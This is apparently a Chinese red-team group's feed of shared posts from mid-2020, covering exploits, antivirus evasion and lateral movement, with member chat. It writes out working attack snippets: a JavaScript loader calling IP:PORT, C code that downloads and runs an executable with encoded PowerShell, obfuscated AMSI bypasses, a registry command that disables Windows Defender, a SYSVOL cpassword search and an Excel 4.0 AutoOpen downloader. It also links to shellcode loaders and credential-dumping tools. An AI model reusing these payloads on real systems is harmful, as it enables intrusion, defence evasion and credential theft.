# RedTeaming - 2020-06-28
Wing FTP Server 6.3.8 - Remote Code Execution  <br><br>存一下，万一用到了呢？<br><br>[GitHub+-+V1n1v131r4/Wing-FTP-Server-6.3.8---Remote...](https://github.com/V1n1v131r4/Wing-FTP-Server-6.3.8---Remote-Code-Execution)<br><br><br>#exploit


# RedTeaming - 2020-06-28
JS reverse shell payload<br><br><script>setInterval(function(){d=document;z=d.createElement(“script”);z.src=“//IP:PORT”;d.body.appendChild(z)},0)</script><br><br> `#渗透技巧#` 


# RedTeaming - 2020-06-28
・ Bypass Office 365 禁用向外部邮件账户自动转发的安全策略 <br><br><br>[Bypassing+External+Mail+Forwarding+Restrictions+wi...](https://blog.netspi.com/bypassing-forwarding-restrictions-power-automate/)<br><br>[Bypassing+External+Mail+Forwarding+Restrictions+wi...](https://blog.netspi.com/bypassing-forwarding-restrictions-power-automate/)

```
裤衩哥: 哇，你们都不用上班没有项目天天搞这些的吗 [撇嘴]
lengyi: [奸笑] 大学狗，没工作
裤衩哥: 你不用乐，你也快了 [奸笑]
lengyi: [捂脸]
Wing: 对不起，我们不用上班的。
裤衩哥: [机智][机智][机智] 揭你伤疤了啊，比如说 math
```
# RedTeaming - 2020-06-29
C# 执行 powershell（之前写的笔记，凑凑数）..<br> 当时测的时候 VT 是 0 杀，windows 10 跑的话先过 AMSI

```
H01k: c# 还可以借助改底层文件来做一个后门。
```
# RedTeaming - 2020-06-29
`#渗透技巧#`  <br>WEBASSEMBLY属于前端的较新技术,作者将C编译成js,通过node执行,达到反弹shell的目的.<br>#include <iostream><br>#include <stdlib.h><br>using namespace std;<br> <br>int main(int argc, const char *argv[]) {<br>system("curl [http://192.168.0.107/nps.exe](http://192.168.0.107/nps.exe) --output C:\\Users\\Public\\nps.exe && C:\\Users\\Public\\nps.exe -encodedcommand QQBkAGQALQBUAHkAcABlACAALQBBAHMAcwBlAG0AYgBsAHkATgBhAG0AZQAgAFAAcgBlAHMAZQBuAHQAYQB0AGkAbwBuAEMAbwByAGUALABQAHIAZQBzAGUAbgB0AGEAdABpAG8AbgBGAHIAYQBtAGUAdwBvAHIAawA7ACQAbQBzAGcAQgBvAGQAeQAgAD0AIAAiAFcAMAAwAHQAIABXADAAMAB0ACEAIQAiADsAWwBTAHkAcwB0AGUAbQAuAFcAaQBuAGQAbwB3AHMALgBNAGUAcwBzAGEAZwBlAEIAbwB4AF0AOgA6AFMAaABvAHcAKAAkAG0AcwBnAEIAbwBkAHkAKQA=");<br>return 0;<br>}<br><br>[WebAssembly+–+Executing+malicious+code+using+Syste...](https://iamroot.blog/2020/06/29/webassembly-executing-malicious-code-using-system/)


# RedTeaming - 2020-06-29
`#提权#`  <br>Win10内核提权<br><br>ps:我这里貌似没成功.<br>自己编译,别用别人编译的,你自己编译的也别给别人,都有你的信息.<br>[Kernel-Exploits/kCFG_Bypass.c+at+master+·+connormc...](https://github.com/connormcgarr/Kernel-Exploits/blob/master/HEVD/Write-What-Where/kCFG_Bypass.c)
![](https://images.zsxq.com/FnF868DAg8LBUjfFOaii3WoYM30H?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1612108799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:QSh-W_T_woFKwjtphqwH8o9kUYE=)
```
Wing: 这个仓库里还有几个提权的 C 代码
裤衩哥: pbd 文件 [流泪]
```
# RedTeaming - 2020-06-29
`#免杀#`  <br>DLL反射注入免杀,CS的相关插件我没印象,我找到再分享.顺带上传个文档.<br>[Reflective+PE+Injection+in+Windows+10+1909+|+BC+Se...](https://www.bc-security.org/post/reflective-pe-injection-in-windows-10-1909/)


# RedTeaming - 2020-06-29
详细解说从外网进入内网再横向<br>由Gcow安全团的的唐小风录制<br>[详细解说从外网进入内网再横向](https://mp.weixin.qq.com/s/l-w1Tx9h-hjg4Y4ZEziiFA)

```
Wing: 这种不建议转发，最好有介绍。
crazyman: 要不 wing 师傅先听听 提炼一下
```
# RedTeaming - 2020-06-29
`#红队技巧#`  <br>用户名或者密码不对的话,这个框框会一直弹.XD<br>Mac csc编译即可.<br><br>[GitHub+-+WingsOfDoom/ICU:+quick+'n+dirty+poc+based...](https://github.com/WingsOfDoom/ICU)
![](https://images.zsxq.com/Fj7Xt7HigGiw8GZobQv1it7InT6E?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1612108799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:zQOdLy19q72QkrYkXniTnGzcp48=)
```
裤衩哥: 这个工具好
lengyi: 插件醒目
秦婉莹: 求问：CS 怎么添加自定义的头啊，就中间那个 redteam 那个
Wing: 反编译 cs，可以去学习二次开发 cs
秦婉莹: 这个有课程嘛
Wing: 你去 bilibili 搜索红队学院，最近的几节课就是讲这个。
秦婉莹: 好的谢谢╰(*´︶`*)╯
秦婉莹: 大佬，我看了下反编译的那个，基础的会了，但是怎么给中间加自定义的标题啊，这个应该改哪个类呢
```
# RedTeaming - 2020-06-29
我也发一个bypassASMI吧，4月份测试的时候，还是可以的，现在改改应该也可以。<br><br>如下：<br><br>[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)<br><br><br>修改：<br><br>$m = "System.Management.Automation.Ams";[Ref].Assembly.GetType("$m" + "iUtils").GetField('amsiI' + 'nitFailed','NonPublic,Static').SetValue($null,$true)<br> `#渗透技巧#`   `#Redteam#`   `#ASMI#` 

```
Wing: 要管理员权限嘛。我下午看 pdf 的时候复现用普通权限没反应。按道理也要 admin 权限才行。
lengyi: 对诶，一般来说是需要 admin 的
```
# RedTeaming - 2020-06-29
mssql 无文件rootkit 利用clr提权到system<br>[MSSQL+Fileless+Rootkit+-+WarSQLKit+-+Eyüp+ÇELİK+//...](http://eyupcelik.com.tr/guvenlik/493-mssql-fileless-rootkit-warsqlkit)


# RedTeaming - 2020-06-29
看刚刚有大佬发sqlserver clr利用，之前写了篇总结，顺便就发了<br>mssql利用&CLR利用&mssqlproxy(针对项目出现问题的排查和解决) <br>xp_cmdshell<br>开启xp_cmdshell存储过程<br>命令执行<br>SP_OACreate<br>(无回显)<br>(有回显)<br>CLR Assemblies<br>CLR代码(不免杀)<br>字节流导入<br>dll文件导入<br>CLR免杀<br>密码：123qwezzzzerc<br><br> `#安全开发#`   `#渗透技巧#`   `#内网渗透#` <br><br>[SQLserver利用 - 裤衩哥的小屋](http://www.8sec.cc/index.php/archives/401/)

```
Black cher*: 能否在 sqlshell 利用，，我现在有个 sqlserver 注入，权限低，跑数据太慢了 [流泪]
裤衩哥: 这得看注入类型了，慢的话可以试试 - threads=10，或者你那个注入是无回显的，我这个文章的场景更多是内网横向扩展
Black cher*: 好的，明白了
L: 写了一下午发现被 sql server 摆了一道，我就说这么数据输出不全 [捂脸]（nchar、nvarchar、ntext。这三种从名字上看比前面三种多了个 “N”。它表示存储的是 Unicode 数据类型的字符。我们知道字符中，英文字符只需要一个字节存储就足够了，但汉字众多，需要两个字节存储，英文与汉字同时存在时容易造成混乱，Unicode 字符集就是为了解决字符集这种不兼容的问题而产生的，它所有的字符都用两个字节表示，即英文字符也是用两个字节表示。nchar、nvarchar 的长度是在 1 到 4000 之间。和 char、varchar 比较起来，nchar、nvarchar 则最多存储 4000 个字符，不论是英文还是汉字；而 char、varchar 最多能存储 8000 个英文，4000 个汉字）
裤衩哥: 你都输出啥了
L: 循环输出命令执行的结果能解决不超过这个大小的
L: 命令执行结果总长度超过最大值
L: 
```
# RedTeaming - 2020-06-30
node+wasm执行恶意code：[WebAssembly+–+Executing+malicious+code+using+Syste...](https://iamroot.blog/2020/06/29/webassembly-executing-malicious-code-using-system/)<br><br>emcc安装：[安装Emscripten+-+C/C++面向wasm编程+-+前端+-+掘金](https://juejin.im/entry/5bcd43a5e51d457a502a7554)
![](https://images.zsxq.com/FpiZaz61wHiShvCKPJpKQQiGs2q_?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1612108799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:b595k7lec7ZRYcjq4-cuyjul60o=)
![](https://images.zsxq.com/Fj2BYnq8OtNRrPBpzP2mQt46Dc2X?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1612108799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:X914bDUe1jZX02ajZwGrTL0fzfg=)

# RedTeaming - 2020-06-30
`#免杀#` <br>Golang版Shellcode加载器,可以选择线程注入或者APC注入.<br>火绒会拦截特征-修改即可,360不拦截-虚拟机测试.<br>使用时在Win或Linux编译,mac不支持Windows库.<br>相关知识可以看这篇文章<br>[[翻译]多种DLL注入技术原理介绍-『外文翻译』-看雪安全论坛](https://bbs.pediy.com/thread-220405.htm)<br><br>用 QueueUserAPC() 函数来强制线程退出等待状态<br>[用+QueueUserAPC()+函数来强制线程退出等待状态_zicheng_lin的专栏-CSDN...](https://blog.csdn.net/zicheng_lin/article/details/6597924)<br>项目地址:[GitHub+-+D00MFist/Go4aRun:+Shellcode+runner+in+GO+...](https://github.com/D00MFist/Go4aRun)
![](https://images.zsxq.com/FjVDIvDS7rFkAd1Wr1W8hYS1TG_0?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1612108799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:FE9H_1-HeDtE5bFctE-hff1vLoQ=)
```
裤衩哥: 有时间学习下
```
# RedTeaming - 2020-06-30
`#免杀#` <br>Golang版Shellcode加载器,可以选择线程注入或者APC注入.<br>火绒会拦截特征-修改即可,360不拦截-虚拟机测试.<br>使用时在Win或Linux编译,mac不支持Windows库.<br>相关知识可以看这篇文章<br>[[翻译]多种DLL注入技术原理介绍-『外文翻译』-看雪安全论坛](https://bbs.pediy.com/thread-220405.htm)<br><br>用 QueueUserAPC() 函数来强制线程退出等待状态<br>[用+QueueUserAPC()+函数来强制线程退出等待状态_zicheng_lin的专栏-CSDN...](https://blog.csdn.net/zicheng_lin/article/details/6597924)<br>项目地址:[GitHub+-+D00MFist/Go4aRun:+Shellcode+runner+in+GO+...](https://github.com/D00MFist/Go4aRun)
![](https://images.zsxq.com/FjVDIvDS7rFkAd1Wr1W8hYS1TG_0?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1612108799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:FE9H_1-HeDtE5bFctE-hff1vLoQ=)
```
裤衩哥: 有时间学习下
```
# RedTeaming - 2020-06-30
某面试题，来说说思路？<br><br>文件上传过滤了 单引号和双引号和 >  ，，， 还有啥骚思路吗？<br><br>Echo没有过滤<br> `#渗透技巧#` 

```
Wing: 是不是没说全。尖括号过滤才头疼
L1m3: 遇到过可以注册账号填写任意内容，上传.htaccess 文件包含 session
lengyi: 垃圾字符填充应该也是一种方法
lengyi: 这个可以啊
裤衩哥: 任意写文件名的话.user.ini 也可以考虑下利用
```
# RedTeaming - 2020-06-30
`#渗透技巧#`   `#Redteam#` 


# RedTeaming - 2020-06-30
免杀工具，考试中，没时间测试，有时间的兄弟可以测试下<br><br>Xeexe is an FUD exploiting tool which compiles a malware with famous payload, and then the compiled maware can be executed on Windows Xeexe Provides An Easy way to create Backdoors and Payload which can bypass TOP antivirus.<br><br><br>[GitHub+-+persianhydra/Xeexe-TopAntivirusEvasion:+U...](https://github.com/persianhydra/Xeexe-TopAntivirusEvasion)<br><br> `#bypassAV #` 渗透技巧# #Redteam#
![](https://images.zsxq.com/Ft0yMNjvamW6pybEFLkCuTyWOa4m?e=1612108799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:iwxl675zE-Q8TLh5qO68lX0OfcE=)
![](https://images.zsxq.com/Ft_VWeASSnPhwgkhEaKsmZH-XzTc?e=1612108799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:d_idWr7OwkSitogWS1z9VzH1_d8=)

# RedTeaming - 2020-06-30
一个小工具<br><br>Ligolo : Reverse Tunneling made easy for pentesters, by pentesters<br><br>Ligolo is a simple and lightweight tool for establishing SOCKS5 or TCP tunnels from a reverse connection in complete safety (TLS certificate with elliptical curve).<br><br>It is comparable to Meterpreter with Autoroute + Socks4a, but more stable and faster.<br><br><br>[GitHub+-+sysdream/ligolo:+Reverse+Tunneling+made+e...](https://github.com/sysdream/ligolo)
![](https://images.zsxq.com/FtNZ8Bk-7cEC7oQASyOu4TrhEdCF?imageMogr2/auto-orient/thumbnail/800x/blur/1x0/quality/75&e=1612108799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:Z2T3sZd1Al6JqYBrYxa8do-xhQQ=)
![](https://images.zsxq.com/FtHov-qnJX3QDun807l8kdLoOM-G?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1612108799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:eceP8JFcb0iHXutLk-6uKhbpN6o=)

# RedTeaming - 2020-06-30
websocket测试网站<br><br>[websocket.org+Echo+Test+-+Powered+by+Kaazing](http://websocket.org/echo.html)
![](https://images.zsxq.com/FkAgHNDGTeepSVXw-GYHCZQmL8pi?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1612108799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:xAf3hx_W4N1akXh2iQ-708etWO8=)

# RedTeaming - 2020-07-01
`#横向移动#` <br>DCOM+HTA进行横向，我测试只能在本地成功，远程主机一直是失败，有师傅来踩踩坑看看？<br>另外就是DCOM的横向有个是通过Excel进行攻击，但是需要x86进程。<br>[https://codewhitesec.blogspot.com/2018/07/lethalht...](https://codewhitesec.blogspot.com/2018/07/lethalhta.html)
![](https://images.zsxq.com/FiT5OyjSUV-f-59SK3vP0hAfPJWY?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1612108799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:oNtU8lPKYLjTY6p98B-8RY0sLFY=)
![](https://images.zsxq.com/FgwbYELJaxMC84uXGDbJRfEfDRD8?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1612108799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:hUa5CqlEKiUdJdQcv7YHsGIhE4w=)
![](https://images.zsxq.com/FrKin7alvXTwRvsH9WfwEgM3eq6x?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1612108799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:tbNzSN790R1TfXr26pwW_pxoU4s=)

# RedTeaming - 2020-07-01
 `#CSTips#`  <br>WebUI下自动化生成C2Profiles<br>╰─ docker run --rm -d -p 3000:80 --name c2profilejs hattmo/c2profilejs:latest
![](https://images.zsxq.com/Fh3lwrw-4hevZXY0FhF94XQ0qN0p?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1612108799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:s7NQm5CrgwKTaqDqRq3vnl3gtrI=)

# RedTeaming - 2020-07-01
通过组策略关闭 Windows Defender：reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /d 1 /t REG_DWORD<br><br> 转自车王的星球


# RedTeaming - 2020-07-02
$a =[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')<br>$h="4456625220575263174452554847"<br>$s =[string](0..13|%{[char][int](53+($h).substring(($_*2),2))})-replace " "<br>$b =$a.GetField($s,'NonPublic,Static')<br>$b.SetValue($null,$true)<br><br>效果看图<br><br> `#bypassAV#`   `#ASMI#` 
![](https://images.zsxq.com/Fi_8nCz-8x7HLori5I4oMM84uGUo?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1612108799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:O93viMlv51JFAf1ACEKulwLl3Ss=)
```
crazyman: amsi wldp evt 都要考虑啊
-: 今天刚好在推上看见
```
# RedTeaming - 2020-07-02
在Kali Linux中使用PowerShell脚本进行渗透测试。<br><br> `#渗透技巧#`  <br><br>[PowerShell+for+Pentesting+in+Kali+Linux+|+Offensiv...](https://www.offensive-security.com/offsec/kali-linux-powershell-pentesting/)

```
Wing: powershell 全平台都支持。kali 老毛子喜欢用。
```
# RedTeaming - 2020-07-02
`#红队技巧#`  <br>自动化发现目标上应用程序可劫持的dll,权限维持岂不是很香？<br>[https://posts.specterops.io/automating-dll-hijack-...](https://posts.specterops.io/automating-dll-hijack-discovery-81c4295904b0)<br>利用代码<br>[DLLHijackTest/Get-PotentialDLLHijack.ps1+at+master...](https://github.com/slyd0g/DLLHijackTest/blob/master/Get-PotentialDLLHijack.ps1)


# RedTeaming - 2020-07-02
amsi dll hijack bypass:[amsi+dll+hijack+bypass](https://articles.zsxq.com/id_np7z7fhkj9wg.html)


# RedTeaming - 2020-07-02
分享国外师傅写的一本通过Csharp来BypassAvs的书，这位师傅github里还有视频讲解和一些成品<br>[GitHub+-+DamonMohammadbagher/eBook-BypassingAVsByC...](https://github.com/DamonMohammadbagher/eBook-BypassingAVsByCSharp)<br><br> `#免杀#` 


# RedTeaming - 2020-07-02
360灵腾实验室出品的一个横向工具<br><br>WMIHACKER<br>免杀横向渗透远程命令执行，常见的WMIEXEC、PSEXEC执行命令是创建服务或调用Win32_Process.create执行命令，这些方式都已经被杀软100%拦截，通过改造出WMIHACKER免杀横向移动测试工具。(无需445端口)<br><br>主要功能：1、命令执行；2、文件上传；3、文件下载<br><br>项目地址：<br>[GitHub+-+360-Linton-Lab/WMIHACKER:+A+Bypass+Anti-v...](https://github.com/360-Linton-Lab/WMIHACKER/)<br><br>看了看代码，里面用到了大量的替换、拼接，以及一些WQL语句，个人感觉可以将里面的ADODB.Stream之类的进行简单替换，来进行二次的使用，可以参考vbs公开的这些东西，或者将cmd的调用，改为移动后调用，或许效果更好。

```
Wing: 图呢？[敲打][敲打]
```
# RedTeaming - 2020-07-02
findstr /S/I cpassword \\<FQDN>\sysvol\<FQDN>\policies\*.xml<br><br> 批量搜索 xml 中 cpassword 字段。最近碰到了，就顺道发出来。<br>gpp 漏洞
![](https://images.zsxq.com/FnnmJPCkwrcipae_PMmcOy6JjHQU?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1612108799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:o7ZeXZhSbxHw13FzZIGiyP5TW00=)

# RedTeaming - 2020-07-02
分享个lolbin<br>1.首先插入一个MS Excel 4.0宏表<br>2.把新建MS Excel 4.0宏表的A1名称改为AutoOpen<br>3.将命令<br>=CALL("INSENG","DownloadFile","BCCJ","[https://google.com](https://google.com)","D:\LOLbinTest\googleIndex.html",1) ‘调用INSENG.dll模块中的DownloadFile函数下载[https://google.com](https://google.com)到D:\test\google.html<br>写入AutoOpen<br>A2写=HALT() '结束指令<br>4.保存,执行<br>当然你也可以采取隐藏那个MS Excel 4.0宏表<br><br>注意:1.仅限win10 2.MS Excel 4.0宏在2013版本以及以下的版本
![](https://images.zsxq.com/FsTobuDgk3eNvaZl63H_D2xJFJgD?e=1612108799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:7-FjKpTBVOkHiemoBA690RROegs=)
![](https://images.zsxq.com/FtoI-L19rXUxpDr0z_Z5yojVTzp5?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1612108799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:PGmIJhu7Y04eYCJNZjnSBpU5Vm0=)
![](https://images.zsxq.com/FucRKBcd53SDKHCoHdbd_2oSLI8m?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1612108799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:5xeRqpJc-5UrvfuBaz82UYvpOd8=)
```
Wing: 第二个条件的意思是 office2013 以下？这个版本怎么看。
crazyman: 你 office 一打开文件的动画就提醒你了啊
Tony: 是不是得启用内容编辑才行？
crazyman: 对啊
Tony: Get
```
# RedTeaming - 2020-07-03
 `#红队技巧#`  <br>昨天lengyi发的，没法无文件执行，需要上传到目标上，挺好用的。使用vb+WQL进行查询和执行。
![](https://images.zsxq.com/FrbZft2JhlN2nJKoWCSZ4FpTzRm4?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1612108799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:NeDF55P19qHE-QaG3ab8Ddl4kpk=)
![](https://images.zsxq.com/FjeBFvvb6rEw-VPXwsUlg3AXD1Ii?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1612108799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:yh80sYHPnaBAN8rYuiUtOGLXH9g=)
```
crazyman: event 回调 并不能持久免杀 会死得很惨
Wing: 那咋整。把里面模块抽离出来改
crazyman: 可以考虑将部分抽取后进行加密
lengyi: 今天测试的，可过 360 全家桶 (虚拟机)，产生 4634、4624、4672、4776 的登录日志，4672 会显示源地址。
```
# RedTeaming - 2020-07-03
`#工具技巧#`  <br>自动化获取子域名、js文件、IP、端口、xray扫描的shell脚本<br>论坛内容禁止外传，有账号自己获取。<br>[T00LS+|+低调求发展+-+潜心习安全](https://www.t00ls.net/thread-56950-1-1.html)


# RedTeaming - 2020-07-03
`#Poc|Exp#` <br>0nise师傅弄的一些武器库<br>gcl [GitHub+-+0nise/spear-framework](https://github.com/0nise/spear-framework) <br>cd spear-framework <br>php -S 127.0.0.1:8001
![](https://images.zsxq.com/Fk0nTpFntni9jQ8-xWGkUrobpjnf?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1612108799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:tHCaUJ6hPCV2S5ApgWj4gE9K3QM=)

# RedTeaming - 2020-07-03
`#Poc|Exp#` <br>0nise师傅弄的一些武器库<br>gcl [GitHub+-+0nise/spear-framework](https://github.com/0nise/spear-framework) <br>cd spear-framework <br>php -S 127.0.0.1:8001
![](https://images.zsxq.com/Fk0nTpFntni9jQ8-xWGkUrobpjnf?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1612108799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:tHCaUJ6hPCV2S5ApgWj4gE9K3QM=)

# RedTeaming - 2020-07-03
`#渗透技巧#`   `#Java安全#` <br><br>利用任意文件下载漏洞自动循环下载并反编译class文件获得网站源码<br>LandGrey太强了<br>[GitHub+-+LandGrey/ClassHound:+利用任意文件下载漏洞循环下载反编译+Cl...](https://github.com/LandGrey/ClassHound)
![](https://images.zsxq.com/FgPrtgaltO3QG6siKXpgsH8aXjtw?e=1612108799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:qpH_V3DhrCHow22IQILtfRP60wc=)

# RedTeaming - 2020-07-03
`#横向移动#`   `#红队技巧#`  <br>利用RDP横向执行命令<br>[GitHub+-+Dm2333/SharpRDP:+SharpRDP改编版](https://github.com/Dm2333/SharpRDP)


# RedTeaming - 2020-07-03
## Question:
cs 4.1 有泄露出来了吗 [坏笑] emm 不能所有人提问啊

## Answer:
4.1 6.25 更新的，我这边的渠道即使拿到也不能公开，只有等大家都公开以后才发修改版。


# RedTeaming - 2020-07-04
 `#CSTips#`  <br>CS4.1加了一个BOF（Beacon Object Files）的玩意，简单来说就是beacon提供了一个内部的API，你可以通过这个api去开发一些自定义的横向功能模块，好处就是我们开发出来的成品体积小，适合用在严格的网络环境下，比如DNS模式，官方的demo是写了一个任意用户登录域内目标主机的BOF，Beacon的API见文档，这个思路太好了，一定要本地调试好BOF，把进程弄崩了，权限就没了。
![](https://images.zsxq.com/FinMo5uEdALoMkuARmML2ZgRmfNI?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1612108799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:EJ82BGcUxcrFfikFPcmv1oHAaSY=)
```
Wing: 见文档[Beacon+Object+Files+-+Cobalt+Strike](https://www.cobaltstrike.com/help-beacon-object-files)
```
# RedTeaming - 2020-07-04
[命令执行之绕过防火墙继续执行命令](https://mp.weixin.qq.com/s/jaO3uFXa2BWqHfbG_wKWSA)


# RedTeaming - 2020-07-05
钓鱼之利用ftp命令搞事情<br><br>去年红队会议中分享的一个样本<br>修理修理还能用，绕一下360。<br>[钓鱼之利用ftp命令搞事情+-+裤衩哥的小屋](http://8sec.cc/index.php/archives/407/)
![](https://images.zsxq.com/Frxv5JmDH7OOrq8Gtnpeqt3T6Ojo?e=1612108799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:Oddu3wVIhvdr-0Zb06bHqRE0-7k=)
```
crazyman: 怪不得 OCEANLOTUS 这么喜欢用这种
```
# RedTeaming - 2020-07-05
`#Poc|Exp#`   `#红队武器化研发#`  <br>Smbghost可以用go版本的进行检测，对应的利用要用py版本的话可以开个代理出来测试。<br><br>[GoGhost/GoGhost.go+at+master+·+deepsecurity-pe/GoG...](https://github.com/deepsecurity-pe/GoGhost/blob/master/GoGhost.go)


# RedTeaming - 2020-07-05
windows PE学习：[windows+PE学习+|+九世的博客](https://422926799.github.io/posts/c925c057.html)


# RedTeaming - 2020-07-05
#红队武器化使用文档<br>Cobalt Strike4.1 官方使用文档<br><br>下载链接：[https://www.cobaltstrike.com/downloads/csmanual41....](https://www.cobaltstrike.com/downloads/csmanual41.pdf)


# RedTeaming - 2020-07-05
[http://8sec.cc/index.php/archives/409/](http://8sec.cc/index.php/archives/409/)<br>一键Dump lsass+logonpassowrd<br>分析上次safekatz并实现<br>顺便更新了下他的mimikatz<br>在项目中这样还是能省不少事情。<br>密码：密码加入星球后查看
![](https://images.zsxq.com/FtZChgw7weLbQRrzu2271ouyeOwY?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1612108799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:lV6ZbYvVNVWgZl2EAkX_0jIobtY=)
```
Wing: 牛批，省事。这下子。
lengyi: msbuild 那个我在搞，不知道啥时候能搞出来...
裤衩哥: 晚些我弄弄试试 [害羞]
lengyi: 白嫖，那我 [坏笑]
Wing: 白嫖党：整快点，等不及了。
裤衩哥: 失败 调了好久，明晚再试吧
```
# RedTeaming - 2020-07-05
发个wmic的用法：<br><br>PS C:\Users\Administrator\Desktop> cscript C:\Windows\System32\winrm.vbs invoke Create wmicimv2/win32_Process -SkipCAche<br>ck -SkipCNcheck -file:.\poc.xml<br><br>xml内容如下<br><br><?xml version="1.0" encoding="UTF-8"?><br><p:Create_INPUT xmlns:p="[http://schemas.microsoft.com/wbem/wsman/1/wmi/root...](http://schemas.microsoft.com/wbem/wsman/1/wmi/root/cimv2/Win32_Process")><br>    <p:CommandLine>calc.exe</p:CommandLine><br>    <p:CurrentDirectory>C:\</p:CurrentDirectory><br></p:Create_INPUT><br><br><br>需要的自取，默认后台运行
![](https://images.zsxq.com/FgEs7n9eq54AbgyaQlUmBLOefg_E?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1612108799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:51-ISVukAtwsUE4TTUKWWCRmiFs=)
![](https://images.zsxq.com/FgCGI_PItzE3qtlnapeJN66qMXyE?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1612108799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:CaZYuBYFIptosWTX6_Bvj99yS40=)
```
Wing: 适合用在 webshell 场景？
一切随缘: win7 下测试，需要管理员权限，需要开启 winrm 服务，然后就是联网的 360 会拦截 webshell 场景需要免杀处理吧 [呲牙] 感谢 lengyi 表哥的分享
lengyi: 咦。我当时测试联网还是不杀的，关于 winrm 这个，因为它本质使用的是 wmi，wmi 的远程需要 winrm 诶，
```
# RedTeaming - 2020-07-06
`#CSTips#`  <br>CS插件推荐,我的建议是打造自己的Kit,想办法把别人的吸收成自己的.<br><br>[GitHub+-+pandasec888/taowu-cobalt-strike](https://github.com/pandasec888/taowu-cobalt-strike)
![](https://images.zsxq.com/FrYFhQGkfOTldTN1H_Grjw7RIDcM?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1612108799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:cd8ATql6-1awUBQKWG0iXEZzyDE=)

# RedTeaming - 2020-07-06
只支持批量

```
Wing: 这个洞这几天没在家还没复现，msf 都加进去了，运营商和银行在用。
L: 试了一下，一堆 rce 无回显。有回显的很少，但是 lfi 个个都有
```
# RedTeaming - 2020-07-08
`#渗透技巧#`  <br>F5漏洞——Burp检测插件<br><br>[BurpBounty/F5-BigIP_CVE-2020-5902.bb+at+master+·+w...](https://github.com/wagiro/BurpBounty/blob/master/profiles/F5-BigIP_CVE-2020-5902.bb)


# RedTeaming - 2020-07-08
Hack the box tabby:[Hack+the+box+tabby+|+九世的博客](https://422926799.github.io/posts/5c929347.html)


# RedTeaming - 2020-07-08
